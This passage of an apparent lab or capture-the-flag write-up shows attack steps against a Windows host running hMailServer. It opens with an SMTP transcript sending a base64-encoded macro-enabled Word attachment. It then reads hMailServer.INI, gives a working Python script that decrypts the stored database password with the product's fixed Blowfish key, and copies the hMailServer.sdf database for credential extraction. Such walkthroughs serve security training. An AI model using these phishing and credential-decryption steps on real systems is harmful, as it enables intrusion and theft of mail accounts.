 -> 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
 -> 
 -> ------=_MIME_BOUNDARY_000_202472--
 -> 
 -> 
 -> .
<-  250 Queued (13.141 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.

```

![Pasted image 20260210151248.png](/ob/Pasted%20image%2020260210151248.png)

***

in the Program Files (x86) , found the

```
Common Files 
hMailServer
 Internet Explorer
  LINQPad5 Microsoft Microsoft Office Microsoft SQL Server Microsoft SQL Server Compact Edition Microsoft Synchronization Services Microsoft Visual Studio 14.0 Microsoft.NET MSBuild Reference Assemblies Veeam Windows Defender Windows Mail Windows Media Player Windows NT Windows Photo Viewer WindowsPowerShell

```

in the\
![Pasted image 20260210160859.png](/ob/Pasted%20image%2020260210160859.png)

in the `hMailServer.INI` found the 8a53bc0c0c9733319e5ee28dedce038e and 4e9989caf04eaa5ef87fd1f853f08b62

```
dir
7za.exe DBSetup.exe DBSetupQuick.exe DBUpdater.exe dh2048.pem hMailAdmin.exe hMailServer.exe hMailServer.INI hMailServer.Minidump.exe hMailServer.tlb Interop.hMailServer.dll libcrypto-1_1.dll libssl-1_1.dll License.rtf msvcp120.dll msvcr120.dll Shared.dll tlds.txt vccorlib120.dll
type hMailServer.INI
[Directories] ProgramFolder=C:\Program Files (x86)\hMailServer DatabaseFolder=C:\Program Files (x86)\hMailServer\Database DataFolder=C:\Program Files (x86)\hMailServer\Data LogFolder=C:\Program Files (x86)\hMailServer\Logs TempFolder=C:\Program Files (x86)\hMailServer\Temp EventFolder=C:\Program Files (x86)\hMailServer\Events [GUILanguages] ValidLanguages=english,swedish [Security] AdministratorPassword=8a53bc0c0c9733319e5ee28dedce038e [Database] Type=MSSQLCE Username= Password=4e9989caf04eaa5ef87fd1f853f08b62 PasswordEncryption=1 Port=0 Server= Database=hMailServer Internal=1
```

```
#!/usr/bin/env python3
# /// script
# dependencies = ["pycryptodome"]
# ///
import sys
import binascii
import struct
from Crypto.Cipher import Blowfish

def swap_endianness(data):
    """Swap endianness of each 4-byte word"""
    result = b''
    for i in range(0, len(data), 4):
        word = data[i:i+4]
        if len(word) == 4:
            result += word[::-1]
        else:
            result += word
    return result

if len(sys.argv) != 2:
    print(f"usage: {sys.argv[0]} <enc>")
    sys.exit()

key = b'THIS_KEY_IS_NOT_SECRET'
encrypted_hex = sys.argv[1]
encrypted = binascii.unhexlify(encrypted_hex)
encrypted_swapped = swap_endianness(encrypted)
cipher = Blowfish.new(key, Blowfish.MODE_ECB)
decrypted = cipher.decrypt(encrypted_swapped)
decrypted_swapped = swap_endianness(decrypted)

print(f"Decrypted: {decrypted_swapped.rstrip(b'\x00').decode('utf-8', errors='replace')}")
```

```
uv run hmail_decrypt.py 4e9989caf04eaa5ef87fd1f853f08b62
Decrypted: 95C02068FD5D
```

The file is in use by the hMailServer process. I’ll make a copy:

```
copy "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
```

```
